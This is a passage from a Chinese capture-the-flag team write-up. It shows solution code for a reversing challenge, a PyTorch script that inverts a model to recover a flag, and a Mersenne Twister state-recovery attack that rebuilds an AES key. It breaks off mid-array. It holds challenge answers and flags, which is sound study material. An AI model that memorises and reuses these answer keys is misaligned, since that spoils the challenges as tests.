<span class="number">0x96</span>, <span class="number">0xC0</span>, <span class="number">0x59</span>, <span class="number">0xAC</span>, <span class="number">0x18</span>, <span class="number">0xDF</span>, <span class="number">0x2D</span>, <span class="number">0xCE</span>, <span class="number">0x3F</span>, <span class="number">0xFB</span>,</span><br><span class="line">                         <span class="number">0xC4</span>, <span class="number">0xED</span>, <span class="number">0xD8</span>, <span class="number">0xD2</span>, <span class="number">0xA8</span>, <span class="number">0x2D</span>, <span class="number">0xF8</span>, <span class="number">0x23</span>, <span class="number">0x9F</span>, <span class="number">0x22</span>,</span><br><span class="line">                         <span class="number">0x25</span>, <span class="number">0xCE</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">            data[i] += flag[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((data[<span class="number">0</span>] ^ ke[<span class="number">0</span>]) == <span class="number">87</span>) &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">int</span> flag1 = (data[i] ^ ke[i % <span class="number">16</span>]) &amp; <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">int</span> flag2 = data[i+<span class="number">16</span>]^flag1;</span><br><span class="line">                printf(<span class="string">&quot;%c&quot;</span>, flag1);</span><br><span class="line">                printf(<span class="string">&quot;\\n2:%c&quot;</span>, flag2);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">	&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>



<p>然后手动整理一下<code>WKCTF&#123;08898c40064d1fc4836db94fe&#125;</code></p>
<h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><h3 id="how-to-encrypt"><a href="#how-to-encrypt" class="headerlink" title="how_to_encrypt"></a>how_to_encrypt</h3><p>问了下<code>gpt</code>得知<code>encrypt</code>的运行结果是<code>ciphertext.txt</code>，其中会用到<code>flag</code>和<code>model.pth</code>，直接扔给<code>gpt</code>，通过<code>flag</code>和<code>model.pth</code>求<code>flag</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 ciphertext.txt 中的内容并转换为张量</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_ciphertext</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        data.append([<span class="built_in">float</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> line.split()])</span><br><span class="line">    <span class="keyword">return</span> torch.tensor(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义网络结构</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Net</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n</span>):</span><br><span class="line">        <span class="built_in">super</span>(Net, self).__init__()</span><br><span class="line">        self.linear = nn.Linear(n, n * n)</span><br><span class="line">        self.conv = nn.Conv2d(<span class="number">1</span>, <span class="number">1</span>, (<span class="number">2</span>, <span class="number">2</span>), stride=<span class="number">1</span>, padding=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.linear(x)</span><br><span class="line">        x = x.view(<span class="number">1</span>, <span class="number">1</span>, n, n)</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载 ciphertext.txt 和 model.pth</span></span><br><span class="line">ciphertext = read_ciphertext(<span class="string">&#x27;ciphertext.txt&#x27;</span>)</span><br><span class="line">n = <span class="built_in">int</span>(ciphertext.shape[-<span class="number">1</span>])  <span class="comment"># 假设最后一维是 n</span></span><br><span class="line">ciphertext = ciphertext.view(<span class="number">1</span>, <span class="number">1</span>, n, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保n与保存的模型一致</span></span><br><span class="line">n = <span class="number">47</span>  <span class="comment"># 根据错误信息设置为47</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化网络</span></span><br><span class="line">mynet = Net(n)</span><br><span class="line">mynet.load_state_dict(torch.load(<span class="string">&#x27;model.pth&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个可优化的输入变量</span></span><br><span class="line">flag_tensor = torch.randn(n, requires_grad=<span class="literal">True</span>, dtype=torch.float32)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 优化器</span></span><br><span class="line">optimizer = torch.optim.Adam([flag_tensor], lr=<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标输出</span></span><br><span class="line">target_output = ciphertext</span><br><span class="line"></span><br><span class="line"><span class="comment"># 迭代优化输入</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    optimizer.zero_grad()</span><br><span class="line">    output = mynet(flag_tensor)</span><br><span class="line">    loss = nn.MSELoss()(output, target_output)</span><br><span class="line">    loss.backward()</span><br><span class="line">    optimizer.step()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> epoch % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Epoch <span class="subst">&#123;epoch&#125;</span>, Loss: <span class="subst">&#123;loss.item()&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取优化后的输入</span></span><br><span class="line">optimized_flag = flag_tensor.detach().numpy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将优化后的输入转换回字符</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">round</span>(x))) <span class="keyword">for</span> x <span class="keyword">in</span> optimized_flag])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered flag:&quot;</span>, flag)</span><br></pre></td></tr></table></figure>

<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="easy-random"><a href="#easy-random" class="headerlink" title="easy_random"></a>easy_random</h3><p>先看给的<code>2496</code>个<code>8</code>位，<code>python</code>的随机数用的是<code>mt19937</code>,<code>624</code>个<code>32</code>位就能预测，回溯,<code>8*4=32；2496/4=624</code>。显而易见，可以操作。参考<strong>2020 pwnhub CoinFlip2得到state</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state = [<span class="number">2922114156</span>, <span class="number">2886276701</span>, <span class="number">1168768544</span>, <span class="number">2339187170</span>, <span class="number">3551087255</span>, <span class="number">117510054</span>, <span class="number">4232565172</span>, <span class="number">1076139110</span>, <span class="number">3366831833</span>, <span class="number">1734453078</span>, <span class="number">4105913658</span>, <span class="number">1066792668</span>, <span class="number">2395352043</span>, <span class="number">785096749</span>, <span class="number">3707690263</span>, <span class="number">2430171307</span>, <span class="number">2064716469</span>, <span class="number">1119720065</span>, <span class="number">1112222395</span>, <span class="number">2136656989</span>, <span class="number">2232844740</span>, <span class="number">388978998</span>, <span class="number">1363102788</span>, <span class="number">67899517</span>, <span class="number">457789137</span>, <span class="number">3527002829</span>, <span class="number">1187847099</span>, <span class="number">1188611575</span>, <span class="number">3830294635</span>, <span class="number">3760337941</span>, <span class="number">297081839</span>, <span class="number">3230408812</span>, <span class="number">2906355860</span>, <span class="number">279725084</span>, <span class="number">3056220997</span>, <span class="number">1053068885</span>, <span class="number">3252084646</span>, <span class="number">2818726015</span>, <span class="number">3615795115</span>, <span class="number">2751222655</span>, <span class="number">74688614</span>, <span class="number">1452880497</span>, <span class="number">426221319</span>, <span class="number">1680367484</span>, <span class="number">4211465923</span>, <span class="number">908441837</span>, <span class="number">2290937869</span>, <span class="number">526329269</span>, <span class="number">3225608663</span>, <span class="number">350552485</span>, <span class="number">885538125</span>, <span class="number">3496826412</span>, <span class="number">3347875222</span>, <span class="number">2730243675</span>, <span class="number">1823616219</span>, <span class="number">1474037291</span>, <span class="number">2474670592</span>, <span class="number">1175091387</span>, <span class="number">1527449390</span>, <span class="number">2024565653</span>, <span class="number">2185945759</span>, <span class="number">902338428</span>, <span class="number">3571876882</span>, <span class="number">632524934</span>, <span class="number">1235569406</span>, <span class="number">3612682285</span>, <span class="number">2727233684</span>, <span class="number">2085380963</span>, <span class="number">1570339017</span>, <span class="number">3839696585</span>, <span class="number">1482742582</span>, <span class="number">646051896</span>, <span class="number">3804319832</span>, <span class="number">2113555238</span>, <span class="number">4150326517</span>, <span class="number">2606046640</span>, <span class="number">1454130831</span>, <span class="number">1919843931</span>, <span class="number">1018624146</span>, <span class="number">1956310311</span>, <span class="number">1162868231</span>, <span class="number">1118548906</span>, <span class="number">974692065</span>, <span class="number">3020424226</span>, <span class="number">2996838388</span>, <span class="number">1724936385</span>, <span class="number">1668410782</span>, <span class="number">3044755338</span>, <span class="number">3710133971</span>, <span class="number">1043581839</span>, <span class="number">362583150</span>, <span class="number">3880481779</span>, <span class="number">114234888</span>, <span class="number">1724135673</span>, <span class="number">1280834309</span>, <span class="number">2958310395</span>, <span class="number">3502226151</span>, <span class="number">620064160</span>, <span class="number">3244210820</span>, <span class="number">3839287479</span>, <span class="number">2283659292</span>, <span class="number">405764632</span>, <span class="number">29535149</span>, <span class="number">2759062778</span>, <span class="number">1662916252</span>, <span class="number">2374319319</span>, <span class="number">3359789079</span>, <span class="number">1896011543</span>, <span class="number">1991740933</span>, <span class="number">2041947596</span>, <span class="number">3393060496</span>, <span class="number">996086198</span>, <span class="number">193135800</span>, <span class="number">1184463268</span>, <span class="number">819767446</span>, <span class="number">410330102</span>, <span class="number">569788256</span>, <span class="number">3880255000</span>, <span class="number">340523190</span>, <span class="number">885031563</span>, <span class="number">2752345656</span>, <span class="number">4116368372</span>, <span class="number">1738848623</span>, <span class="number">1895472503</span>, <span class="number">85502529</span>, <span class="number">334873925</span>, <span class="number">3543996685</span>, <span class="number">3082948803</span>, <span class="number">3195880838</span>, <span class="number">1458851187</span>, <span class="number">2843458392</span>, <span class="number">20236078</span>, <span class="number">3136689072</span>, <span class="number">2121777470</span>, <span class="number">3543587943</span>, <span class="number">3590933177</span>, <span class="number">4057799526</span>, <span class="number">1241162800</span>, <span class="number">1014541188</span>, <span class="number">1031410742</span>, <span class="number">267989518</span>, <span class="number">92604561</span>, <span class="number">2190353015</span>, <span class="number">87786611</span>, <span class="number">435741463</span>, <span class="number">3800398555</span>, <span class="number">1860727248</span>, <span class="number">2608606593</span>, <span class="number">287619193</span>, <span class="number">768990059</span>, <span class="number">1686137462</span>, <span class="number">3255556540</span>, <span class="number">3234299857</span>, <span class="number">2087562050</span>, <span class="number">1575350832</span>, <span class="number">1982640551</span>, <span class="number">1476745138</span>, <span class="number">2757668599</span>, <span class="number">108958643</span>, <span class="number">337813164</span>, <span class="number">273001595</span>, <span class="number">3515727084</span>, <span class="number">2976758889</span>, <span class="number">2674818924</span>, <span class="number">2133197017</span>, <span class="number">3709052669</span>, <span class="number">1992118633</span>, <span class="number">2421927781</span>, <span class="number">174599786</span>, <span class="number">3608298365</span>, <span class="number">1708985493</span>, <span class="number">3925831183</span>, <span class="number">3063611093</span>, <span class="number">3852984733</span>, <span class="number">540242111</span>, <span class="number">1623482619</span>, <span class="number">1874921843</span>, <span class="number">1317809124</span>, <span class="number">2774735715</span>, <span class="number">3828180102</span>, <span class="number">1997343223</span>, <span class="number">1516869708</span>, <span class="number">941992323</span>, <span class="number">307089973</span>, <span class="number">368181535</span>, <span class="number">163007409</span>, <span class="number">596938343</span>, <span class="number">1686397275</span>, <span class="number">52708329</span>, <span class="number">230996593</span>, <span class="number">3597201983</span>, <span class="number">378926364</span>, <span class="number">3618422671</span>, <span class="number">2062721049</span>, <span class="number">3659976071</span>, <span class="number">546629459</span>, <span class="number">3976307656</span>, <span class="number">1509609055</span>, <span class="number">3677736141</span>, <span class="number">1613243397</span>, <span class="number">1378877471</span>, <span class="number">531534610</span>, <span class="number">2602178644</span>, <span class="number">4099876535</span>, <span class="number">1394187732</span>, <span class="number">1706260244</span>, <span class="number">1842911215</span>, <span class="number">3381571710</span>, <span class="number">456693813</span>, <span class="number">1667668257</span>, <span class="number">792813840</span>, <span class="number">4044011316</span>, <span class="number">1391972141</span>, <span class="number">1677638507</span>, <span class="number">1467741933</span>, <span class="number">2542725716</span>, <span class="number">3261642613</span>, <span class="number">1122181516</span>, <span class="number">1726857655</span>, <span class="number">2765884383</span>, <span class="number">2563231823</span>, <span class="number">1890137479</span>, <span class="number">3462591813</span>, <span class="number">290505918</span>, <span class="number">3480784421</span>, <span class="number">4146013364</span>, <span class="number">906268950</span>, <span class="number">1460571462</span>, <span class="number">625398701</span>, <span class="number">1868955581</span>, <span class="number">2562420879</span>, <span class="number">3524561573</span>, <span class="number">2480663847</span>, <span class="number">424010572</span>, <span class="number">3760440358</span>, <span class="number">506451740</span>, <span class="number">2616205788</span>, <span class="number">3835513223</span>, <span class="number">2698078113</span>, <span class="number">933669512</span>, <span class="number">2259175222</span>, <span class="number">1766445936</span>, <span class="number">3062774434</span>, <span class="number">3383207496</span>, <span class="number">165724374</span>, <span class="number">717679250</span>, <span class="number">872303977</span>, <span class="number">1054921507</span>, <span class="number">1640987195</span>, <span class="number">2398705310</span>, <span class="number">744526846</span>, <span class="number">2142916476</span>, <span class="number">3769314780</span>, <span class="number">3643489144</span>, <span class="number">906983325</span>, <span class="number">1001096018</span>, <span class="number">1522376663</span>, <span class="number">3516789445</span>, <span class="number">425379249</span>, <span class="number">1807654888</span>, <span class="number">1584889396</span>, <span class="number">996500676</span>, <span class="number">2138028000</span>, <span class="number">1877118731</span>, <span class="number">2780715755</span>, <span class="number">56317932</span>, <span class="number">994780643</span>, <span class="number">231703463</span>, <span class="number">1590924826</span>, <span class="number">449553992</span>, <span class="number">1970334362</span>, <span class="number">3631415563</span>, <span class="number">2378887069</span>, <span class="number">2645995105</span>, <span class="number">604040985</span>, <span class="number">766274135</span>, <span class="number">2897107084</span>, <span class="number">3122401328</span>, <span class="number">604584226</span>, <span class="number">3514594183</span>, <span class="number">3159592392</span>, <span class="number">539086862</span>, <span class="number">1966827756</span>, <span class="number">1548312674</span>, <span class="number">2223920152</span>, <span class="number">4193868755</span>, <span class="number">2604831097</span>, <span class="number">2301554299</span>, <span class="number">2919432501</span>, <span class="number">3445772747</span>, <span class="number">221908018</span>, <span class="number">1919849944</span>, <span class="number">1707243688</span>, <span class="number">1311680342</span>, <span class="number">1132835813</span>, <span class="number">824121832</span>, <span class="number">2623654824</span>, <span class="number">4245764621</span>, <span class="number">1669541543</span>, <span class="number">793028119</span>, <span class="number">1400611299</span>, <span class="number">2330555992</span>, <span class="number">1295319061</span>, <span class="number">2376883177</span>, <span class="number">3054784982</span>, <span class="number">1534527889</span>, <span class="number">3381065612</span>, <span class="number">431181624</span>, <span class="number">2520679460</span>, <span class="number">1612115175</span>, <span class="number">3417053178</span>, <span class="number">3202101207</span>, <span class="number">4112825474</span>, <span class="number">209873225</span>, <span class="number">3982289256</span>, <span class="number">3175605361</span>, <span class="number">1007754107</span>, <span class="number">1533969733</span>, <span class="number">3657972615</span>, <span class="number">1233249703</span>, <span class="number">1775877579</span>, <span class="number">2812100730</span>, <span class="number">3215107528</span>, <span class="number">1781386145</span>, <span class="number">3025989255</span>, <span class="number">3066346118</span>, <span class="number">3283795978</span>, <span class="number">1197222174</span>, <span class="number">2936543382</span>, <span class="number">3503535134</span>, <span class="number">2892598771</span>, <span class="number">2621962168</span>, <span class="number">931511531</span>, <span class="number">2231087188</span>, <span class="number">4146539078</span>, <span class="number">4002087507</span>, <span class="number">2491835423</span>, <span class="number">4060649251</span>, <span class="number">4048333160</span>, <span class="number">2444738719</span>, <span class="number">2691519303</span>, <span class="number">1556526141</span>, <span class="number">3615497232</span>, <span class="number">4050826531</span>, <span class="number">500299044</span>, <span class="number">717467546</span>, <span class="number">2206683369</span>, <span class="number">861398548</span>, <span class="number">3151369905</span>, <span class="number">4029791836</span>, <span class="number">3416545629</span>, <span class="number">4120104600</span>, <span class="number">1465267912</span>, <span class="number">483234533</span>, <span class="number">3035820989</span>, <span class="number">3832933168</span>, <span class="number">3568690105</span>, <span class="number">96174302</span>, <span class="number">2545526712</span>, <span class="number">1102861924</span>, <span class="number">1074783639</span>, <span class="number">4182941480</span>, <span class="number">1533353222</span>, <span class="number">1488829617</span>, <span class="number">1503690984</span>, <span class="number">185887778</span>, <span class="number">4211993208</span>, <span class="number">2290188486</span>, <span class="number">1146083769</span>, <span class="number">2041769341</span>, <span class="number">2684027677</span>, <span class="number">3176900642</span>, <span class="number">1387338494</span>, <span class="number">946259368</span>, <span class="number">1066487432</span>, <span class="number">795876682</span>, <span class="number">3861793354</span>, <span class="number">1668825820</span>, <span class="number">216618949</span>, <span class="number">2896083408</span>, <span class="number">3851619025</span>, <span class="number">442276681</span>, <span class="number">206355214</span>, <span class="number">270139248</span>, <span class="number">347366931</span>, <span class="number">1910792165</span>, <span class="number">3953458832</span>, <span class="number">2734158556</span>, <span class="number">2811136264</span>, <span class="number">1920172269</span>, <span class="number">1837836373</span>, <span class="number">3778467275</span>, <span class="number">3779230355</span>, <span class="number">3897121172</span>, <span class="number">2344011383</span>, <span class="number">1146522764</span>, <span class="number">2190434845</span>, <span class="number">609244986</span>, <span class="number">2013714652</span>, <span class="number">560173192</span>, <span class="number">2402932255</span>, <span class="number">1072869170</span>, <span class="number">1770725561</span>, <span class="number">952360909</span>, <span class="number">1412825165</span>, <span class="number">3696544236</span>, <span class="number">2306376326</span>, <span class="number">2830983153</span>, <span class="number">207976619</span>, <span class="number">4155556879</span>, <span class="number">3728896627</span>, <span class="number">2654370117</span>, <span class="number">3334033001</span>, <span class="number">1365410137</span>, <span class="number">1493856098</span>, <span class="number">1253593280</span>, <span class="number">1631830970</span>, <span class="number">5803336</span>, <span class="number">3918597809</span>, <span class="number">86127041</span>, <span class="number">333464839</span>, <span class="number">3604499396</span>, <span class="number">149662371</span>, <span class="number">2129288705</span>, <span class="number">1461710188</span>, <span class="number">3760680120</span>, <span class="number">3729872359</span>, <span class="number">2100765881</span>, <span class="number">3535556758</span>, <span class="number">444301423</span>, <span class="number">2716178967</span>, <span class="number">1126522126</span>, <span class="number">4087265377</span>, <span class="number">129975151</span>, <span class="number">3676574817</span>, <span class="number">946781552</span>, <span class="number">1144144314</span>, <span class="number">4160587561</span>, <span class="number">3992786314</span>, <span class="number">45372372</span>, <span class="number">2839307265</span>, <span class="number">3121990915</span>, <span class="number">2417091275</span>, <span class="number">2394722122</span>, <span class="number">2336989436</span>, <span class="number">3126674182</span>, <span class="number">3231554964</span>, <span class="number">3785353831</span>, <span class="number">3066121066</span>, <span class="number">4059908701</span>, <span class="number">3257600631</span>, <span class="number">3304564137</span>, <span class="number">976977941</span>, <span class="number">2994176851</span>, <span class="number">3509885563</span>, <span class="number">436168092</span>, <span class="number">2194926470</span>, <span class="number">572263581</span>, <span class="number">2964578564</span>, <span class="number">2577729800</span>, <span class="number">4257414592</span>, <span class="number">1074783671</span>, <span class="number">2629434251</span>, <span class="number">42822614</span>, <span class="number">1475322010</span>, <span class="number">3068645543</span>, <span class="number">3694724738</span>, <span class="number">3480058324</span>, <span class="number">4204711804</span>, <span class="number">3168448984</span>, <span class="number">2767935672</span>, <span class="number">3016152818</span>, <span class="number">4134435775</span>, <span class="number">2141315517</span>, <span class="number">2182008981</span>, <span class="number">2871864678</span>, <span class="number">2294299758</span>, <span class="number">1409773258</span>, <span class="number">3418660825</span>, <span class="number">3090287076</span>, <span class="number">3241139267</span>, <span class="number">2315623533</span>, <span class="number">2157788904</span>, <span class="number">334169841</span>, <span class="number">2062298350</span>, <span class="number">4075844652</span>, <span class="number">1672438569</span>, <span class="number">2994084656</span>, <span class="number">2204498767</span>, <span class="number">2430183901</span>, <span class="number">4179388667</span>, <span class="number">317027997</span>, <span class="number">2894184457</span>, <span class="number">3635887387</span>, <span class="number">1307832846</span>, <span class="number">3358657065</span>, <span class="number">734371454</span>, <span class="number">610520453</span>, <span class="number">3421706671</span>, <span class="number">3240587498</span>, <span class="number">3690351924</span>, <span class="number">935152653</span>, <span class="number">2737123774</span>, <span class="number">203357945</span>, <span class="number">1027962332</span>, <span class="number">3777141639</span>, <span class="number">743025036</span>, <span class="number">4046422672</span>, <span class="number">1085389282</span>, <span class="number">110265143</span>, <span class="number">320421926</span>, <span class="number">1931570193</span>, <span class="number">936595461</span>, <span class="number">2927488848</span>, <span class="number">2265674314</span>, <span class="number">3444945553</span>, <span class="number">786566925</span>, <span class="number">4133145648</span>, <span class="number">2879270131</span>, <span class="number">4165751769</span>, <span class="number">3985446237</span>, <span class="number">1971125873</span>, <span class="number">3724681025</span>, <span class="number">2661325531</span>, <span class="number">2441664181</span>, <span class="number">3290805620</span>, <span class="number">2459158763</span>, <span class="number">2102811157</span>, <span class="number">2881160687</span>, <span class="number">1153639082</span>, <span class="number">827213914</span>, <span class="number">3028527431</span>, <span class="number">2205345684</span>, <span class="number">3556675715</span>, <span class="number">1279123065</span>, <span class="number">4253124398</span>, <span class="number">3483559979</span>, <span class="number">4068430995</span>, <span class="number">4141206587</span>, <span class="number">2571521727</span>, <span class="number">2944439402</span>, <span class="number">443124686</span>, <span class="number">2268164570</span>, <span class="number">2235451426</span>, <span class="number">3679071975</span>, <span class="number">3129207272</span>, <span class="number">2516367556</span>, <span class="number">1468462786</span>, <span class="number">1881517367</span>, <span class="number">3491042253</span>, <span class="number">2913831047</span>, <span class="number">3164481275</span>, <span class="number">202602034</span>, <span class="number">3150723817</span>, <span class="number">1533130707</span>, <span class="number">1912730441</span>, <span class="number">2090267514</span>, <span class="number">3558123575</span>, <span class="number">1133228007</span>, <span class="number">3421482977</span>, <span class="number">2553693497</span>, <span class="number">3421969717</span>, <span class="number">2520271965</span>, <span class="number">2067324870</span>, <span class="number">1223636150</span>, <span class="number">2714495378</span>, <span class="number">3773685424</span>, <span class="number">2961634881</span>, <span class="number">88882886</span>, <span class="number">408668635</span>, <span class="number">904339271</span>, <span class="number">3187997208</span>, <span class="number">2883270961</span>, <span class="number">1911371885</span>, <span class="number">1111177434</span>, <span class="number">3677904221</span>, <span class="number">1424566197</span>, <span class="number">456428662</span>, <span class="number">3160502725</span>, <span class="number">2571618126</span>, <span class="number">1931038165</span>, <span class="number">1229862345</span>, <span class="number">885692642</span>, <span class="number">928907436</span>, <span class="number">281108918</span>, <span class="number">2025639202</span>, <span class="number">4098934983</span>, <span class="number">245166619</span>, <span class="number">3978368942</span>, <span class="number">2335134348</span>, <span class="number">2663736265</span>, <span class="number">3483476476</span>, <span class="number">1019177183</span>, <span class="number">1076843627</span>, <span class="number">2150626843</span>, <span class="number">3549898506</span>, <span class="number">497411044</span>, <span class="number">2948681730</span>, <span class="number">1293862520</span>, <span class="number">3364439483</span>, <span class="number">200913955</span>, <span class="number">876046583</span>, <span class="number">2810673955</span>, <span class="number">2828391839</span>, <span class="number">1905062360</span>, <span class="number">3783182365</span>, <span class="number">2472665728</span>, <span class="number">1439731349</span>, <span class="number">2736703148</span>, <span class="number">3316496080</span>, <span class="number">2996051367</span>, <span class="number">448455111</span>, <span class="number">3808598160</span>, <span class="number">2313472828</span>, <span class="number">1619655346</span>, <span class="number">1198200314</span>, <span class="number">3744504057</span>, <span class="number">1680713197</span>, <span class="number">2474661491</span>, <span class="number">3214410863</span>, <span class="number">1662774943</span>, <span class="number">3537885099</span>, <span class="number">3365412658</span>, <span class="number">3583677483</span>]</span><br></pre></td></tr></table></figure>

<p>再到<code>GitHub</code>里看这篇<a target="_blank" rel="noopener" href="https://github.com/NonupleBroken/ExtendMT19937Predictor%E5%8F%AF%E4%BB%A5%E9%A2%84%E6%B5%8B%E5%92%8C%E5%9B%9E%E6%BA%AF%E5%BE%97%E5%88%B0%60data%60%EF%BC%8C%E5%AD%A6%E4%B9%A0%E4%B8%8B%E9%9D%A2%60randbytes%60%E5%87%BD%E6%95%B0%EF%BC%8C%E5%86%99%E4%BB%A3%E7%A0%81%E5%BE%97%E5%88%B0%60key%60%EF%BC%8C%E8%A7%A3%60aes%60%E5%8D%B3%E5%8F%AF">https://github.com/NonupleBroken/ExtendMT19937Predictor可以预测和回溯得到`data`，学习下面`randbytes`函数，写代码得到`key`，解`aes`即可</a></p>
<p>![Untitled (C:&#x2F;Users&#x2F;Lenovo&#x2F;Desktop&#x2F;viol1t战队WP&#x2F;Untitled (3).png)](viol1t战队WP&#x2F;Untitled (3).png)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> extend_mt19937_predictor <span class="keyword">import</span> ExtendMT19937Predictor</span><br><span class="line"></span><br><span class="line">predictor = ExtendMT19937Predictor()</span><br><span class="line">data = [<span class="number">3086615663</span>, <span class="number">3771906507</span>, <span class="number">1933791567</span>, <span class="number">874400704</span>, <span class="number">4000928288</span>, <span class="number">1101512046</span>, <span class="number">3757205682</span>, <span class="number">895930285</span>, <span class="number">2975657910</span>, <span class="number">1590250704</span>, <span class="number">227397937</span>, <span class="number">3163700038</span>, <span class="number">1702493296</span>, <span class="number">86408336</span>, <span class="number">1317214060</span>, <span class="number">355017934</span>, <span class="number">4281601498</span>, <span class="number">2958424486</span>, <span class="number">3248821687</span>, <span class="number">1977038961</span>, <span class="number">75767861</span>, <span class="number">1848107476</span>, <span class="number">1201089736</span>, <span class="number">1669521311</span>, <span class="number">3079560731</span>, <span class="number">753259725</span>, <span class="number">2783047520</span>, <span class="number">1792692953</span>, <span class="number">1335325755</span>, <span class="number">4118154638</span>, <span class="number">221587457</span>, <span class="number">3931660158</span>, <span class="number">2105971738</span>, <span class="number">205787269</span>, <span class="number">3306213190</span>, <span class="number">3047766446</span>, <span class="number">757659831</span>, <span class="number">70863674</span>, <span class="number">2054184739</span>, <span class="number">418281550</span>, <span class="number">2654142751</span>, <span class="number">3195128907</span>, <span class="number">3920550815</span>, <span class="number">273337573</span>, <span class="number">856860348</span>, <span class="number">2332777112</span>, <span class="number">1144893468</span>, <span class="number">4097373151</span>, <span class="number">2348453877</span>, <span class="number">3391728911</span>, <span class="number">1909111864</span>, <span class="number">1167657184</span>, <span class="number">1690201897</span>, <span class="number">3037596190</span>, <span class="number">2683689827</span>, <span class="number">2591985588</span>, <span class="number">483396539</span>, <span class="number">583852871</span>, <span class="number">4213595783</span>, <span class="number">3297463098</span>, <span class="number">3940471284</span>, <span class="number">3167491933</span>, <span class="number">3836764654</span>, <span class="number">385184073</span>, <span class="number">4089593895</span>, <span class="number">2435556034</span>, <span class="number">2689611721</span>, <span class="number">3009515703</span>, <span class="number">2557788155</span>, <span class="number">742759035</span>, <span class="number">2911234764</span>, <span class="number">2747466359</span>, <span class="number">1658388676</span>, <span class="number">77325257</span>, <span class="number">1282826102</span>, <span class="number">833518584</span>, <span class="number">258773596</span>, <span 